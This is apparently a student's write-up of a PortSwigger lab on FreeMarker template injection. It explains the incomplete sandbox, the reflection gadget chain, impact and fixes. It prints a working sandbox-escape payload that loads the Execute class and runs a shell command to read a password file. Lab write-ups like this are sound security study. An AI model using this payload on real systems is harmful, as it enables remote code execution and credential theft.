# Server-Side Template Injection in a Sandboxed Environment
---
## TARGET
PortSwigger Web Security Academy  
Lab: _Server-Side Template Injection in a Sandboxed Environment_

---
## DESCRIPTION
The application uses the **FreeMarker** template engine (Java) to render product pages. While it restricts the use of dangerous built-in functions (like `?new`), the sandbox implementation is incomplete. It fails to restrict access to the underlying Java object properties, allowing attackers to access the **ClassLoader** via an existing object in the template context.

---
## ROOT CAUSE
**Incomplete Sandbox (Exposed ClassLoader):** The sandbox prevents direct instantiation of arbitrary classes but does not strip the `.class` property from objects available in the data model (like the `product` object).
- **Vulnerability:** `product.class.protectionDomain.classLoader` gives access to the system's ClassLoader.
- **Mechanism:** This allows the attacker to manually load and instantiate restricted classes (like `Execute`) indirectly, bypassing the sandbox's blacklist.

---
## ATTACK SCENARIO
1. **Reconnaissance:** The attacker injects `<#list .data_model?keys as key>${key}</#list>` to enumerate available objects in the template context. The `product` object is discovered.
2. **Sandbox Analysis:** Attempts to use `<#assign ex = "freemarker.template.utility.Execute"?new()>` fail due to sandbox restrictions.
3. **Gadget Chain Construction:** The attacker uses the exposed `product` object to traverse the Java reflection hierarchy:
    - Access the `ClassLoader`.
    - Load the `ObjectWrapper` class (needed to wrap Java objects for FreeMarker).
    - Load the `Execute` class (the utility for running shell commands).
4. **Exploitation:** The attacker instantiates the `Execute` class and runs `cat /home/carlos/my_password.txt`.
5. **Exfiltration:** The file content is rendered in the template preview and submitted to solve the lab.

---
## PROOF OF CONCEPT
### Injection Point
- **URL:** `/product/template?productId=1`
- **Parameter:** `template`
- **Method:** POST (Preview Action)
- ### Payload Used
```Java
<#assign classloader = product.class.protectionDomain.classLoader>
<#assign owc = classloader.loadClass("freemarker.template.ObjectWrapper")>
<#assign dwf = owc.getField("DEFAULT_WRAPPER").get(null)>
<#assign ec = classloader.loadClass("freemarker.template.utility.Execute")>
${dwf.newInstance(ec, null)("cat /home/carlos/my_password.txt")}
```
### Retrieval Point
The password string is rendered directly in the `div#preview-result` element of the HTTP response.

---
## IMPACT
**Critical (Sandbox Escape / RCE):** Bypassing the sandbox allows the attacker to execute arbitrary system commands with the privileges of the web server user. This negates the security controls intended to limit the impact of template injection, leading to full system compromise.

---
## FIX / MITIGATION
- **Robust Sandboxing:** Use a `ClassResolver` or `MemberAccessPolicy` (in newer FreeMarker versions) to strictly block access to `getClass()`, `ClassLoader`, and `ProtectionDomain` on all objects.
- **Update Engine:** Ensure the template engine is updated to a version that defaults to a safer configuration (e.g., FreeMarker 2.3.30+ has improved sandbox defaults).
- **Principle of Least Privilege:** Run the application with restricted permissions so that even if code execution occurs, access to sensitive files is denied.

---
## KEY LEARNING
- **Reflection is Key:** In Java/JVM environments, sandboxes often focus on blocking _instantiation_ (`new`) but forget to block _reflection_ (`.class`, `.getClass()`). If you can touch an object, you can often reach its ClassLoader.
- **Enumeration First:** Finding the `product` object was the critical first step. Always enumerate available variables (`.data_model` in FreeMarker, `locals()` in Python, etc.) before trying to build an exploit chain.

---
